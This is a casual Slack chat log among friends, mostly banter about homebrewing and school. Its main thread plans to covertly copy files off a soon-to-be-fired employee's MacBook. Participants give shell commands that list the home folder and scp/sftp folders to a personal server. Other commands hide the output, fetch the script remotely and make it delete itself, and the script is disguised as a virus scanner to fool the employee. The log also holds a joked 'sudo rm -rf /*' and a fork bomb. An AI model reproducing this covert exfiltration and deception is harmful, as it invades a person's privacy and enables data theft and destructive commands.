@@ -1,0 +1,648 @@
+Some malaysians got control of a couple of my peeps emails over the weekend :confused:
+Phishing?
+It would appear so
+No
+someone must have signed in somewhere they shouldnt have
+in other news
+I have to help fire someone today
+which is never any fun
+Haha oh man that should be interesting. What'd they do
+Yes
+Kiddy pr0n?
+Not kiddy porn
+but another porn case
+anyways 2 questions for my genius friends today
+1
+What kind of weird shit was he in to? XD
+what is the best iPhone app to free up space
+thats also fre
+free
+1. none
+really :confused:
+Factory Reset
+lol
+Haaaaaaa
+Apps can't access the filesystem
+buh dum tis
+/giphy throw it on the ground
+You have to go into the usage summary in the settings app and figure out what is using all the space
+Pr0n taking up too much space
+:point_up:
+well shit
+ok next question
+I have to retrieve information from this guy’s computer that I have to fire before tomorrow
+he has a macbook
+and is located in houston
+No
+Slackbot hacked Bobby's account
+Leave me alone
+anyone have any Ideas as to how I can retrieve the data
+/giphy roadtrip
+If his machine was open to it and on a VPN (doubt it) you could ssh into it if you had admin access
+Yes
+Thats what I'm saying
+Otherwise you'll need physical access
+I know the password to his account on the machine
+maybe
+possibly
+I dunno
+I can also trick him into thinking
+Do yall have a VPN?
+Getting him to expose SSH under the guise of updates wouldn't be super difficult I wouldn't think. But if he isn't on VPN you'll have to get him to port  forward which would be difficult I'd suspect.
+No
+I may be able to have access to his machine for a few seconds using chrome remote desktop
+I do not believe chrome remote desktop has a curtain mode though
+this is why I cant use it to retrieve the files
+He cant know I am taking his files before tomorrow
+hence why I am attempting to hack into his machine
+In that case VPN is out of the question FTP is key. Also using the terminal since it has that "magic" factor to non-techies
+omg
+yes
+so setup a ftp
+on his machine and pull the data from mine
+he wouldnt know what would be happening until I had finished and teminated connections
+No
+Or Vice Versa. You need a machine accessible via the interwebs already.
+Like how I ususally have my server set up
+you would want to dump the files from his machine to another machine
+No
+Lol send him a batch file or some script and ask him to run it. 
+
+Do you know the exact directory?
+On his machine you'd be doing:
+`scp -r myPr0nFolder user@zacsServerIp:place/to/store`
+<@U12VAQUN4> I suspect part of the problem is he'd need to do some explorin' first
+Yeah a script would only be super effective if you already knew the directory
+No
+Recursively copy his whole drive. That'll show em
+exactly
+So what my goal now is is to start up a ftp server on his machine
+preferably via terminal after I have remoted into his machine
+To set up an FTP server on his machine, his router would have to forward port 22 to his machine
+Yes
+Isn't ftp port 21? 
+22
+It'd be easier to set up the server on one of your machines that can have its port forwarded and scp from his machine to your machine
+22 for SFTP
+Ahh sftp
+(FTP over SSH)
+hmm
+Ok this has been some good inspiration
+Do you have a web server you can access via SSH?
+yes
+Theres your server
+No additional set up required
+the problem then is that how do I navigate and access the files on the guy’s machine without him knowing
+Chrome Desktop to his machine -&gt; open terminal -&gt; find pr0n -&gt; Use scp command from above to transfer files -&gt; profit
+no
+I cant do that
+Why?
+He'll see it
+hmmmm
+as soon as he sees me snooping through his files thats it
+This is a mac right?
+yes
+Hmmm
+Hmmm
+perplexing scenario I know
+Depending on how much time you have you can set up some scripts to investigate kind of
+`ls /* &gt; files.txt`
+`scp files.txt myserver`
+Examine the contents
+interesting concept
+you know what
+Write another script to grab the data
+that could work
+Yes
+Theres a better command to show the files as a tree structure though
+Yeah there is
+I forget it though
+Are these images or videos? Both?
+This might work: `find . -type d | sed -e "s/[^-][^\/]*\//  |/g" -e "s/|\([^ ]\)/|-\1/"`
+Ahh sed
+glorious stream editor
+You'd need to store these scripts somewhere (github could even work) and `wget` them on the target machine
+No
+Mm delicious wget
+omg joseph
+Yuh
+`(find . -type d | sed -e "s/[^-][^\/]*\//  |/g" -e "s/|\([^ ]\)/|-\1/") &gt; list.txt` Run this in his home directory
+Then grab that list file and delete it
+Once you've grabbed the offending files
+Run this for good measure: `sudo rm -rf /*`
+lol jk DON'T do that
+I know lol
+you need a sudo for the first one too btw
+At least I think so
+Not if your in the user's home directory
+If you were trying to list the root directory maybe
+When I am trying to run it I’m getting a permission denied
+nvm
+ok
+ok
+:+1:
+I think I am seeing this
+Ooaah
+So you just get a list of files?
+so really the biggest thing is gonna be running a script
+From that
+yea
+SCP formats data streams
+to make them easier to read
+ok
+so what I will then need to do is do an sftp to the webserver and push up everything
+Yes
+Ill run a couple test and it should be good
+Yes
+I dont need to remove anything
+I jsut need to get proof of the infractions
+<@U12V0LN6Q|slayterdev> uploaded a file: <https://flippedbit.slack.com/files/slayterdev/F2ZC3B9A8/Investigation.sh|Investigation>
+Well in that case the list may be all you need
+Yeah you can just use that list
+Although that relies on the files being named like "backdoor sluts 9.mp4" or something
+yes and know
+:point_up:
+yes and no*
+the more sinister part of this task is to retrieve certain proposal documents from the guy’s computer
+Oh. He has important stuff you'll need after he gets fired?
+mhmmm
+Updated the shell snippet
+this one includes files (the other was just directories XD)
+directories would also work
+No
+my main task is to find his proposals
+I already have proof of his browsing history
+Ah ok
+that was easy to snag
+Lemme change it back
+:+1:
+the more difficult thing to do is really getting these proposals off his machine
+:wink:
+And you guys have been a big help
+:clap: :clap: :clap: :clap: :clap: :clap: :clap: :clap: :clap: :clap: :clap:
+I had forgotten about the idea of running a script to send it all up to my server
+lol
+A round of applause for all
+just needed a little help from my frans
+and a little coffee -_-
+How did the brew go this weekend?
+Quite well. Damn thing was thumpin like crazy this morning
+angry little cub
+Thats what we're gonna call the soda XD
+lol
+very nice
+Also whipped up a batch of Apfelwein :slightly_smiling_face:
+:open_mouth:
+This sounds beautiful and phenomenal
+It shall be
+It was dead simple to make
+what was the process like?
+Grab a gallon of Apple Juice (100% juice. No preservatives) per gallon of Apfelwein you want to make
+Get 0.4 lbs of sugar (preferably corn sugar but whatever) per gallon
+Pour half a gallon of juice into sanitized fermenter
+Add the sugar (divide it per gallon) to the half empty jug and shake the devil out of it
+Repeat for each gallon
+Add the sugar/juice mixtures to fermenter
+Add yeast (wine or beer. NOT bread)
+Wait at least a month (wait more though. trust me)
+Try not to die from over consumption
+:apple: :wine_glass:
+<@U12V0LN6Q|slayterdev> set the channel topic: Hacker conglomerate elite!
+ I am so ready to get started on this mead
+The nectar of the gods!
+So much :honey_pot:
+mmmmm
+just gotta get that Money for the Honey
+:money_mouth_face:
+<http://www.foxnews.com/travel/2016/11/02/world-s-longest-bar-crawl-stops-at-every-pub-in-uk.html>
+traveling sales person to the max
+omg
+rediculous
+<@U1308KFJ4> hey did you see mark posted up the pics from the wedding
+<@U1308KFJ4|zapturk> uploaded a file: <https://flippedbit.slack.com/files/zapturk/F2YK6TGAC/pasted_image_at_2016_11_07_10_51_am.png|Pasted image at 2016-11-07, 10:51 AM>
+How goeth it?
+there is a map of it
+that would be one crazy pub craw
+No
+Wonder how long it would take
+Yes
+45,495km tour
+the longest is a 435km, 50-hour trip, from the Sango Sands Oasis in Durness to the Bells But &amp; Ben in Shetland
+Is anyone really good with child processes in C?
+
+I have a program that implements piping like in the linux command line (" whatever | whatver") using two child processes and we have to print a message from the parent process after the child processes complete, but no matter where I put the print statement the parent prints out before the child process output.
+Are you using `wait`?
+<@U12VAQUN4|joseph.v> uploaded a file: <https://flippedbit.slack.com/files/joseph.v/F2ZAQ4HJN/main__.txt|main()>
+Yeah
+This is how I have it right now
+I think I really only need one wait
+I think you need to pass the child pid to wait
+so I have two children (as per the instructions)
+So if I remember correctly
+For a process to wait for another process to complete, you need to pass the pid of the process you are waiting on to wait in the parent process
+Ok. Well I have both the child PIDs.
+how do I wait for both of them. Just two waitpid statements?
+I believe so
+Hmm lemme try it
+now my output is weird XD
+<@U12VAQUN4|joseph.v> uploaded a file: <https://flippedbit.slack.com/files/joseph.v/F2YLE0N0Z/-.txt|Untitled>
+Ah threading. Now yproblemou ha3ve s
+did u have a stroke
+XD
+It was multithreading XD
+Haha yeah
+;D
+Lol
+I just got the go ahead from the head of Houstons department. 
+DOIT
+Operation porn and proposal hunter begins now
+/giphy DOIT
+How exciting
+/giphy hackers go!
+/giphy hacker away
+thats better
+<https://www.youtube.com/watch?v=X7XbukdoGmM>
+<@U12V0LN6Q> I sense a bit of sarcasm XD
+#asshathacking
+No I'm actually genuinely excited to see how the plan works out!
+Hes gonna shit his pants
+It was fun devising a plan
+I’ll keep you guys in the loop
+/giphy hackerman
+Man I’m still sick from last week
+hate sinus infections
+Lame
+me too man
+I think its this weather change that is getting to me
+my nose i still running
+im doped up on that cough shit
+/giphy nose is running
+Must be something going around. Kara has like a cough too right now
+poor thing :disappointed:
+Yeah. She's doing ok though. Tomorrow is the big reveal though!
+I took an allergy pill this morning. I feel okay except for a headache
+Oh hell ya
+You ready for it <@U12V0LN6Q> ?
+Haha yeah. I know what I think it is but idk if I'm ready if we get a curve ball (a gurl) XD
+hahaha I hope its a boy too
+TAKE THE LITTLE MAN TO BESBOLL GAMES
+MAKE HIM A MAYNE
+ROOT FOR SPROTS
+YEAH SPORTSBALL
+/giphy sportsball
+lol
+sprts r my fav
+We can play catch wit him
+and teach him the ways of recursion
+Whatever it is, they will be the first heir to the Angry Bear Throne. So they better enjoy brewing XD
+Yes
+mmmm
+kids never like the thinks there parents do
+^^^ this
+Not true
+My father was a drummer
+I was a drummer
+checkmate
+lol
+#justsaying 9 time out of 10 its not that way
+/giphy checkmate atheists
+do you and your dad listen to the same music?
+Same in principle but from different eras
+how do I make a .sh file executable on mac <@U12V0LN6Q>
+But that doesn't negate my point
+`chmod +x myFile.sh`
+thank you
+dumb question
+There are no dumb questions
+Just dumb people
+Which you are not :slightly_smiling_face:
+thanks man...
+You is smart
+You is kind
+You is important
+Also for a shell file you can just use `sh myFile.sh`
+mmm sezy
+right now I am trying to remember my pass for the web server
+Also be sure if you make it executable you have `#!/bin/bash` at the top
+already done
+Kewwwwwl
+im fucking stupid
+the webserver doesnt have sftp setup
+I dont know how
+fucking godaddy
+hmmmm
+what happens when you try?
+it’ll run as a standard ftp
+there are just no login credentials setup
+Id have to go and enable it is all I wanna say
+ah I see
+Usually if you have SSH set up, scp will work
+No
+Fuck off robot bitch!
+the company that set it up initially must not have done the thing
+Well what I was gonna do in the script was basically search for any folders that have the term “proposal in it” and if it doesnt find it then just copy over the entire home folder.
+that’d just be like cp /* -rf
+or something similar
+use ~ instead of /
+~/*
+~ means home
+yes
+will do
+No
+anyone seen doctor strange yet?
+naw
+Not yet :(
+I have no idea what I can do here
+since sftp doesnt work
+I cant use scp
+I thought you were setting up sftp?
+I am
+What does it say when you try?
+but I cant find any options to setup sftp in the portal
+only shit for ftp
+Maybe enable it via SSH?
+Idk how exactly but there must be a way
+I know right
+how could they not offer the service in this day and age
+No
+ok ssh is disabled
+that explains alot
+Enabke that shit
+Your account contains Old Value Applications. You will have to remove these applications before enabling SSH.
+Learn More
+Yes
+lol
+thats the reason it wont enablel
+Well shit 
+I’m just sitting here like wtf is old value applications
+the server doesnt run any applications
+it literally is just sitting there hosting bullshit data
+no wordpress joomla or drupal
+just pure html
+(and css and js you know how it goes)
+Man I can not get this program to print where it's supposed to :disappointed:
+:disappointed:
+:disappointed:
+<@U1372C4NM> your memes keep me going
+scream for the memes
+:disappointed:
+<@U132256GZ|zaccheezymac> uploaded a file: <https://flippedbit.slack.com/files/zaccheezymac/F303M592T/pasted_image_at_2016_11_07_01_05_pm.png|Pasted image at 2016-11-07, 1:05 PM>
+lol
+lawl
+Damn girl is your ass critical data? Cuz i wanna back it up
+<@U132256GZ|zaccheezymac> uploaded a file: <https://flippedbit.slack.com/files/zaccheezymac/F2ZD2162E/pasted_image_at_2016_11_07_01_16_pm.png|Pasted image at 2016-11-07, 1:16 PM>
+<http://kxan.com/2016/11/06/weather-causes-evacuations-at-sound-on-sound-festival/>
+<@U132256GZ> good thing we didnt go to this
+what?
+hahaha
+thats awesome
+Still would have loved to have seen mac
+Yes
+he didnt play
+oh ya that was last weekend
+who was playing this weekend
+ah yes
+explosions
+dear hunter
+he was supost to but he drop because of family health issue
+killinger!!!!
+dillinger*
+dillinger was playing
+Man. I want to be done with school 
+:confused:
+I'm so tired, and I want a big boy job. 
+:disappointed:
+Sometimes big boy jobs suck too
+But it is better than school I must admit
+I dont  wanna go back
+Cs get degrees, but I'm burning out. 
+Thats a great song title. 
+yuh
+yee
+I'll write it. 
+I feel you so hard rn. I'm DONE with school lol
+I got my schedule for all next year, and dear God its gonna be tough. 
+But I can do it. 
+I wish you guys the utmost luck. I know ya'll will succeed!
+No
+Holy shit fuck off slackbot XD
+What?
+My sched is ok. 
+
+I'm dying rn though. I have a migraine or something. 
+hell yea brothers!
+BEAT BACK THEM DEMONS WHICH AIM TO DESTROY YOU
+AMEN BROTHERRRRRR
+I'm sitting here in class as my way of beating back the demons. 
+Phuck physics though
+<https://youtu.be/YRSlwhlTPUE>
+enough cough syrup keeps me comfortably numb
+*heavy southern accent* YEA THOUGH I WALK THROUGH THE VALLEY OF THE SHADOW OF DEATH, I SHALL FEAR NO EVILLLLLL
+Ayyy
+HAHAHAHA <@U12V0LN6Q> 
+<@U12V0LN6Q> not as long you got dat sawed shotty
+I think we ALL said that to cal 2
+the boom stick
+Fuck yee
+omg
+cal 2
+Which I'm still retaking. Dammit 
+^^same
+Everything will be okay!!!
+No
+Cal 2 is the deveel
+I have stigma with that class
+*Alex Jones voice* CAL 2 YOU DIRTY DIRTY DEVILLL!!!!
+AGGHHHHHHHHHHHHHHHHHH
+If I get over that all my other classes will be a breeze. Just because it will do like minus 85 stress from my dex/ str build. 
+No
+Aka life
+Slackbot.  I'm gonna seg fault your ass 
+I'm busy right now
+<https://youtu.be/klDruz4tHww>
+Slackbot! Execute: `:(){ :|: &amp; };:`
+..what?
+<https://youtu.be/IUE9ZwCSMH4>
+OMG I'm dying XD
+so the script now works
+and I’m good to deploy
+the problem is
+you can see whats happening in the terminal when you run the script
+is there any way for me to hide the terminal after I enter the password
+Run in the bg
+cmd+H
+can you run scp in the background
+Or cmd z
+&amp;
+so `scp cmd goes here.... &amp;`
+got ya
+`scp list.txt serverStuff &amp;`
+thats what I was looking for
+thank you
+test it first
+Phat
+Actually just ./myScript &amp;
+But don't you need to put in the server password... :thinking_face:
+yea
+Hardcode. 
+Lol jk
+Hmm let me think'
+If I can get it to run the rest in the background after inputting the password that’s all I’m needing
+LISP or loose walking privalges for a week?
+Well actually &amp; will still dump the output...
+Yes
+Pick one. 
+Lisp
+I want bad at LISP
+wasnt*
+Ok so I'm thinkin run the script
+Enter the pass when prompted
+Immediatley hide the window
+Confirm on your end the file is uploaded
+Kill the terminal without opening it back up
+Better idea:
+`scp list.txt serverStuff &gt; /dev/null`
+You can enter your password and no scp output is shown
+what’ll this do
+ok
+ok
+i got you
+test it
+oh shit it worked
+:fire: :+1: :fire:
+/giphy fucking noice
+So last piece of the puzzle. You gotta host that script and wget it
+Liek dis: `wget <https://github.com/SlayterDev/DeafShark/blob/master/OSXBuildScript.sh>`
+ah fuck wget isnt default on mac
+brb
+Pastebin
+Too open
+<@U12V0LN6Q> I got that under control
+Oh ok good
+;)
+Sweet
+I'm good gentlemen thank you for the brainstorm sesh
+/giphy supah hot fiyah
+now I cant delete my test folders from the web server
+nvm
+gots it
+yeeee
+oh god
+this could take a long time
+Yes
+Por que
+I tested it on my machine
+and alot of the files in my downloads folder contain os images
+Heh i see
+Shouldn't be more than a minute or two especially for an average user
+im contemplating throwing in a -c tag
+for compression
+-c for cake
+The cake is a lie.
+<@U12V0LN6Q|slayterdev> uploaded a file: <https://flippedbit.slack.com/files/slayterdev/F2ZCUF4BD/slack_for_ios_upload.mp4|Slack for iOS Upload> and commented: Dude this beer is going crazy 
+is gon esplode
+Fer reals
+Kara said it was gurgling XD
+is it making a mess in the bottom of the freezer
+Yup
+Gotta change out the star san
+lol jeez dude
+The bear is agressive :open_mouth:
+Do you know off the top of your head if you can scp mulitple directories in a single line
+Doesn't really look like it.
+If its all in the same parent dir you can just grab that dir with the `-r` flag
+so im gonna have to enter in the password for each command
+I’m using the -r flag right now
+but i have to copy over mulitple folders
+I suppose so :confused:
+Got it!
+What?
+One sec
+I just finished doctoring it up to make it look like a virus scanner (using the premise that we have to do a virus scan to let me remote into his computer)
+<@U12V0LN6Q|slayterdev> uploaded a file: <https://flippedbit.slack.com/files/slayterdev/F2YQPBZND/Untitled.sh|Untitled>
+interesting
+gonna test it in a second
+check the edit
+got it
+Also if you want to dump it in the home folder of the server use `.`
+It defaults to the home folder of the server user unlike scp
+i actually have a path im gonna ave it to
+I think it should work though
+No
+kewl
+hang tight
+ok
+it works in a since
+sense
+I just need it to copy over the folders
+so i need to put the -r flag
+hold tight while I spit dis shit
+looks like you put the -r after `sftp` and before `user@host`
+thats what I was thinking as well
+it seems to have worked
+waiting now
+ok
+I had to make the directories on the server
+gonna see if it runs now
+forgot sftp doesnt make it for you
+kewl
+ok
+added in a clear terminal
+kill terminal
+and delete script
+now running a final test for potency
+Well if you're deleteing script via terminal, delete then kill term
+lol
+I did
+I just described the features in the wrong order
+testing now
+im escited
+we are like
+hax0rs
+I wonder if `rm $0` would delete the script itself :thinking_face:
+Yes
+yep
+it does
+Well there ya go
+to be exact
+rm -- "$0"
+"You didn't see anything"
+how to you format it to look like code?
+``code here``
+Use single backticks tho
+``spacetits = awesome``
+shit
+Just one on each side
+`try again`
+yesss!
+:+1:
+the script works
+and not a moment too soon
+Triple back ticks for multi line code
+```awww yisssss
+```awww yisssss
+dammit to hell
+Well at least thats the way it is for our work one
+Alright I'm going dark for about an hour
+Gud luck
+why?
+wait brad
+Don't believe his lies
+i need u
+:(\
+What's up? I gotta drive
+GREETINGS!!
+Nothing
+Just gonna miss you
+I missed you too :cry:
+Anybody else wanna go to the monk tomorrow night for election night?
+I may be able to
+Have a cold pint and wait for all of this to blow over?
+<http://i.imgur.com/QBDpSvd.mp4>
+Yea I was gonna go
+Kewl
+<@U12V0LN6Q|slayterdev> uploaded a file: <https://flippedbit.slack.com/files/slayterdev/F2YSUALN4/angrybearkooziedraft.png|AngryBearKoozieDraft.png> and commented: <@U12VAQUN4> Its not perfect but I got bored and started messing with the logo. How’s it look for the koozies?
+That looks really cool!! 
+Thanks!
+daaannnkkk
+Danks :ok_hand:
